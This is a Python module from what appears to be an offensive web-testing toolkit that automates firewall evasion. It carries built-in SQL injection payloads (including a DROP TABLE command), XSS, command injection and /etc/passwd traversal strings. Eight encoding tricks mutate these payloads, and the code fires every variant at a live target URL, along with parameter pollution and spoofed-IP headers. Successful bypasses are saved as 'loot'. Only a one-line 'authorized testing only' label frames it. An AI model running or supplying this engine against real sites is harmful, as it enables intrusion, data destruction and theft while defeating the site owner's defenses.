#!/usr/bin/env python3
"""
WAF Bypass Engine — Cyberburg v5 PHANTOM PROTOCOL
Automated WAF evasion: URL encoding, Unicode, hex, case mutation, comment
insertion, HTTP parameter pollution, chunked transfer, header tricks.

AUTHORIZED PENETRATION TESTING ONLY.
"""

import os
import re
import json
import time
import urllib.parse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from utils.helpers import run_command, get_timestamp, sanitize_filename
from utils.banner import print_info, print_success, print_warning, print_error
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

# ─── Baseline Payloads ────────────────────────────────────────────────────────

SQLI_BASE   = ["' OR 1=1--", "' UNION SELECT 1,2,3--", "1; DROP TABLE users--"]
XSS_BASE    = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
CMD_BASE    = ["; id", "| id", "`id`", "$(id)"]
LFI_BASE    = ["../../../etc/passwd", "....//....//etc/passwd"]
PATH_BASE   = ["/etc/passwd", "/windows/win.ini"]

# ─── Encoding Engines ─────────────────────────────────────────────────────────

def _url_encode(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def _double_url_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _html_entities(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)


def _hex_encode(s: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in s)


def _unicode_encode(s: str) -> str:
    return "".join(f"%u{ord(c):04x}" for c in s)


def _case_mutate(s: str) -> str:
    result = []
    toggle = True
    for c in s:
        result.append(c.upper() if toggle else c.lower())
        if c.isalpha():
            toggle = not toggle
    return "".join(result)


def _sql_comment_insert(s: str) -> str:
    return s.replace(" ", "/**/")


def _null_byte(s: str) -> str:
    return s + "%00"


def _tab_newline(s: str) -> str:
    return s.replace(" ", "\t").replace("OR", "OR\n")


ENCODERS = {
    "URL Encode":         _url_encode,
    "Double URL Encode":  _double_url_encode,
    "HTML Entities":      _html_entities,
    "Hex Encode":         _hex_encode,
    "Case Mutation":      _case_mutate,
    "SQL Comment Spaces": _sql_comment_insert,
    "Null Byte Suffix":   _null_byte,
    "Tab/Newline":        _tab_newline,
}


def generate_bypass_payloads(payloads: list) -> dict:
    """Apply all encoders to each base payload."""
    variants = {}
    for base in payloads:
        variants[base] = {}
        for name, fn in ENCODERS.items():
            try:
                variants[base][name] = fn(base)
            except Exception:
                pass
    return variants


# ─── WAF Detection ────────────────────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare":   re.compile(r'cloudflare|cf-ray|__cfduid', re.I),
    "AWS WAF":      re.compile(r'aws-waf|x-amzn-requestid', re.I),
    "Akamai":       re.compile(r'akamai|akamaighost|x-check-cacheable', re.I),
    "Sucuri":       re.compile(r'sucuri|x-sucuri-id', re.I),
    "ModSecurity":  re.compile(r'mod_security|modsecurity', re.I),
    "Imperva":      re.compile(r'imperva|incapsula|x-iinfo', re.I),
    "F5 BIG-IP":    re.compile(r'bigip|f5|tmui', re.I),
    "Barracuda":    re.compile(r'barracuda', re.I),
    "Fortinet":     re.compile(r'fortigate|fortiweb', re.I),
    "Nginx WAF":    re.compile(r'naxsi', re.I),
}


def detect_waf(url: str) -> dict:
    """Detect WAF type from response headers and body."""
    detected = []
    raw = ""

    if not HAS_REQUESTS:
        return {"detected": [], "raw": "requests not available"}

    # Normal request
    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10,
                         verify=False)
        headers_str = " ".join(f"{k}: {v}" for k, v in r.headers.items())
        combined = headers_str + " " + r.text[:500]
        raw = headers_str

        for waf_name, pattern in WAF_SIGNATURES.items():
            if pattern.search(combined):
                detected.append(waf_name)

    except Exception as e:
        raw = str(e)

    # Send a malicious payload and check for block page
    try:
        r2 = requests.get(url + "?id=1'+OR+1=1--",
                          headers={"User-Agent": "Mozilla/5.0"},
                          timeout=10, verify=False)
        if r2.status_code in (403, 406, 412, 429, 503):
            if not detected:
                detected.append(f"Unknown WAF (blocked with {r2.status_code})")
            raw += f" | Block status: {r2.status_code}"
    except Exception:
        pass

    return {"detected": detected, "raw": raw}


# ─── Bypass Testing ───────────────────────────────────────────────────────────

def test_bypasses(url: str, param: str, base_payloads: list, output_dir: str) -> dict:
    """Send all encoded variants and record which ones slip through."""
    result = {
        "module": "WAF Bypass — Payload Testing",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not HAS_REQUESTS:
        result["raw"] = "requests not available"
        return result

    print_info(f"Testing WAF bypass payloads on param '{param}'...")

    variants = generate_bypass_payloads(base_payloads)
    bypassed = []

    # First: get baseline block rate with unencoded payload
    blocked_baseline = 0
    for base in base_payloads:
        try:
            r = requests.get(url, params={param: base}, timeout=8, verify=False)
            if r.status_code in (403, 406, 412, 429, 503):
                blocked_baseline += 1
        except Exception:
            pass

    if blocked_baseline == 0:
        result["raw"] = "No WAF blocking detected on baseline payloads — target may not have WAF"
        return result

    # Now test encoded variants
    for base, encodings in variants.items():
        for enc_name, encoded in encodings.items():
            try:
                r = requests.get(url, params={param: encoded}, timeout=8, verify=False)
                # Bypass = WAF didn't block it (not 403/406/412 etc.) but payload might have reflected
                not_blocked = r.status_code not in (403, 406, 412, 429, 503)
                reflected = encoded[:10] in r.text or urllib.parse.unquote(encoded[:10]) in r.text

                if not_blocked:
                    bypassed.append({
                        "base": base,
                        "technique": enc_name,
                        "encoded": encoded[:80],
                        "status": r.status_code,
                        "reflected": reflected
                    })
                    sev = "CRITICAL" if reflected else "HIGH"
                    result["findings"].append({
                        "type": f"WAF Bypass — {enc_name}",
                        "severity": sev,
                        "url": f"{url}?{param}=...",
                        "detail": f"Technique '{enc_name}' bypassed WAF (HTTP {r.status_code}, reflected={reflected})"
                    })
                    print_success(f"Bypass: {enc_name} on '{base[:30]}' — status {r.status_code}")

            except Exception:
                pass

    # HTTP Parameter Pollution
    try:
        r = requests.get(url + f"?{param}=safe&{param}=' OR 1=1--",
                         timeout=8, verify=False)
        if r.status_code not in (403, 406, 412, 429, 503):
            result["findings"].append({
                "type": "WAF Bypass — HTTP Parameter Pollution",
                "severity": "HIGH",
                "url": url,
                "detail": "Duplicate parameter with malicious value bypassed WAF"
            })
            print_success("HTTP Parameter Pollution bypass succeeded")
    except Exception:
        pass

    # Save bypass report
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)
    with open(os.path.join(loot_dir, "waf_bypasses.json"), "w") as f:
        json.dump(bypassed, f, indent=2)

    result["raw"] = f"WAF bypass test complete — {len(bypassed)} bypass techniques worked"
    return result


# ─── Header-Based Bypass ──────────────────────────────────────────────────────

BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"Forwarded": "for=127.0.0.1"},
]


def header_bypass_test(url: str, output_dir: str) -> dict:
    """Test IP spoofing headers to bypass WAF IP-based rules."""
    result = {
        "module": "WAF Bypass — Header Spoofing",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not HAS_REQUESTS:
        result["raw"] = "requests not available"
        return result

    print_info("Testing header-based WAF bypass (IP spoofing)...")

    try:
        baseline = requests.get(url, timeout=8, verify=False)
        baseline_status = baseline.status_code
    except Exception:
        result["raw"] = "Could not reach target"
        return result

    malicious_path = url + "?id=1'+OR+1=1--"

    for header_set in BYPASS_HEADERS:
        try:
            r = requests.get(malicious_path, headers=header_set, timeout=8, verify=False)
            if r.status_code != 403 and r.status_code == baseline_status:
                header_name = list(header_set.keys())[0]
                result["findings"].append({
                    "type": "WAF Bypass — Header IP Spoof",
                    "severity": "HIGH",
                    "url": url,
                    "detail": f"Header '{header_name}: 127.0.0.1' bypassed WAF block (HTTP {r.status_code})"
                })
                print_success(f"Header bypass: {header_name}")
        except Exception:
            pass

    result["raw"] = f"Header bypass test complete — {len(result['findings'])} bypasses found"
    return result


# ─── Orchestrator ─────────────────────────────────────────────────────────────

def run_waf_bypass(session, output_dir: str):
    """Full WAF bypass engine."""
    from utils.banner import print_section
    from rich.prompt import Prompt
    print_section("WAF BYPASS ENGINE — PHANTOM PROTOCOL", "bold magenta")

    url = session.url

    # Detect WAF
    print_info("Detecting WAF...")
    waf_info = detect_waf(url)
    waf_names = waf_info.get("detected", [])
    if waf_names:
        print_success(f"WAF detected: {', '.join(waf_names)}")
        session.add_result({
            "module": "WAF Detection",
            "target": url,
            "timestamp": get_timestamp(),
            "raw": waf_info.get("raw", ""),
            "findings": [{
                "type": "WAF Detected",
                "severity": "INFO",
                "url": url,
                "detail": f"WAF: {', '.join(waf_names)}"
            }]
        })
    else:
        print_warning("No WAF detected or WAF does not block test payloads")

    # Ask which param to fuzz
    param = Prompt.ask(
        "  [bold cyan]Target GET parameter to fuzz[/bold cyan] [dim](e.g. id, q, search)[/dim]",
        default="id"
    ).strip()

    # SQLi bypass
    r = test_bypasses(url, param, SQLI_BASE, output_dir)
    session.add_result(r)

    # XSS bypass
    r = test_bypasses(url, param, XSS_BASE, output_dir)
    session.add_result(r)

    # Header-based bypass
    r = header_bypass_test(url, output_dir)
    session.add_result(r)

    # Summary
    all_findings = [f for m in session.modules[-4:] for f in m.get("findings", [])]
    bypasses = [f for f in all_findings if "Bypass" in f.get("type", "")]

    table = Table(title="WAF Bypass Summary", box=box.SIMPLE, header_style="bold cyan")
    table.add_column("Technique", style="cyan", width=35)
    table.add_column("Severity", width=10)
    table.add_column("Detail", style="dim")

    for f in all_findings[:25]:
        sev = f.get("severity", "INFO")
        sev_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow"}.get(sev, "blue")
        table.add_row(
            f.get("type", "-"),
            f"[{sev_color}]{sev}[/{sev_color}]",
            f.get("detail", "")[:70]
        )

    console.print(table)
    console.print(f"\n  [bold green][+] WAF bypass complete — {len(bypasses)} bypass techniques worked[/bold green]")
